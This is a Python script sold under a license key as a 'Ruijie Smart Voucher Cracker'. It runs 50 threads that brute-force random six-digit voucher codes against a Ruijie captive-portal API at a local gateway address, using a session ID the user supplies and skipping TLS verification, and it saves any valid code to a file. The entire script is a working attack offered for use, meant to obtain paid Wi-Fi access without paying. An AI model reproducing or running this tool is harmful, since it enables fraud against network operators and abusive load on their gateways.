import sys, os, hashlib, subprocess, datetime, requests, time, random, string, threading
from colorama import Fore, Style, init
from urllib.parse import urlparse, parse_qs

init(autoreset=True)

# --- [ CONFIGURATION ] ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")
_found = False
_active_codes = ["......"] * 5

# --- [ LICENSE & SECURITY SYSTEM ] ---
def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except: return datetime.datetime.now()

def get_hwid():
    user = subprocess.check_output(['whoami']).decode().strip()
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def check_access():
    uid = get_hwid()
    now = get_net_time()
    
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()
            for i in range(0, 366):
                check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
                if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                    print(f"{Fore.GREEN}[✔] LOGIN SUCCESS! (Valid until: {check_date})")
                    return True
    
    print(f"{Fore.CYAN}==========================================")
    print(f"      RUIJIE SMART VOUCHER CRACKER        ")
    print(f"==========================================")
    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
    u_key = input(f"{Fore.WHITE}ENTER LICENSE KEY: ").strip()
    
    for i in range(0, 366):
        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
        if u_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
            with open(KEY_FILE, "w") as f: f.write(u_key)
            print(f"{Fore.GREEN}[✔] ACTIVATED!")
            return True
    return False

# --- [ CORE INJECTION LOGIC ] ---
def _crack(host, sid, slot):
    global _found
    sess = requests.Session()
    headers = {
        "Content-Type": "application/json",
        "Referer": f"{host}/index.php",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F)"
    }
    
    while not _found:
        v = "".join(random.choice(string.digits) for _ in range(6))
        _active_codes[slot % 5] = v
        try:
            # Ruijie Update API Structure
            payload = {
                "accessCode": v, 
                "sessionId": sid, 
                "authType": "voucher", 
                "apiVersion": 1
            }
            res = sess.post(f"{host}/api/auth/voucher/", json=payload, headers=headers, timeout=10, verify=False)
            
            if res.status_code == 200:
                data = res.json()
                # Ruijie success code is 0
                if data.get('error') == 0 or data.get('success') == True:
                    _found = True
                    print(f"\n\n{Fore.GREEN}{Style.BRIGHT}═══════════════════════════════════════")
                    print(f"{Fore.GREEN}[✔] SUCCESS! VALID VOUCHER FOUND")
                    print(f"{Fore.WHITE}{Style.BRIGHT}      VOUCHER CODE : {v}          ")
                    print(f"{Fore.GREEN}{Style.BRIGHT}═══════════════════════════════════════")
                    with open("found_codes.txt", "a") as f:
                        f.write(f"Ruijie: {v} | {datetime.datetime.now()}\n")
                    os._exit(0)
        except: pass

# --- [ MAIN CONTROLLER ] ---
def main():
    os.system('clear')
    if not check_access(): 
        print(f"{Fore.RED}[✘] INVALID KEY!"); return

    print(f"\n{Fore.YELLOW}[*] Ruijie Gateway Detection...")
    
    # WiFi ချိတ်မထားရင် Manual ရိုက်လို့ရအောင် လုပ်ထားပါတယ်
    sid = input(f"{Fore.CYAN}[+] Enter Ruijie SessionID (SID): ").strip()
    
    if not sid:
        print(f"{Fore.RED}[!] SID is required to start injection."); return

    # Host IP ကို Ruijie ပုံမှန် IP ထားပေးထားပါတယ် (လိုအပ်ရင် ပြင်နိုင်ပါတယ်)
    host = "http://192.168.110.1"
    
    print(f"{Fore.GREEN}[✓] Target: {host}")
    print(f"{Fore.CYAN}[*] Initializing 50 Hacking Threads...")
    time.sleep(1)

    try:
        # Thread ပေါင်း ၅၀ နဲ့ တစ်ပြိုင်တည်း ပစ်မယ်
        for i in range(50):
            threading.Thread(target=_crack, args=(host, sid, i), daemon=True).start()
        
        while not _found:
            st = " | ".join([f"{Fore.CYAN}{c}{Fore.RESET}" for c in _active_codes])
            sys.stdout.write(f"\r{Fore.YELLOW}[☠] INJECTING: {st} ")
            sys.stdout.flush()
            time.sleep(0.08)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Aborted.")

if __name__ == "__main__":
    main()
